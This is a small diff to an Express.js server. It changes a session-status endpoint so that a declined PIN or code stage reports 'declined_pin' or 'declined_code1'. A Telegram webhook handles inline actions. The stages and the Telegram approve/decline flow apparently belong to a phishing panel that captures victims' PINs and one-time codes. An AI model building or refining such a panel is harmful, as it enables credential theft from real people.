@@ -133,21 +133,19 @@ app.get("/api/status", (req, res) => {
   const session = sessions.get(sessionId);
 
   if (!session) return res.status(404).json({ error: "Session missing." });
-  
-  // If the request comes from an older screen, ignore it
   if (session.stage !== stage) return res.json({ status: "idle" });
 
   const currentStatus = session.status;
 
-  // CORE FIX: Instead of dropping directly back to 'idle' globally,
-  // we change it to 'idle' but respond with a distinct status specifying the broken page
+  // 🔄 THE CHANGE IS HERE: 
   if (currentStatus === "declined") {
-    session.status = "idle"; 
-    return res.json({ status: `declined_${stage}` });
+    session.status = "idle";
+    return res.json({ status: `declined_${stage}` }); // Sends "declined_pin" or "declined_code1" to your frontend
   }
 
   res.json({ status: currentStatus });
 });
+
 
 // Receive Telegram Webhook inline actions
 app.post("/telegram-webhook", async (req, res) => {
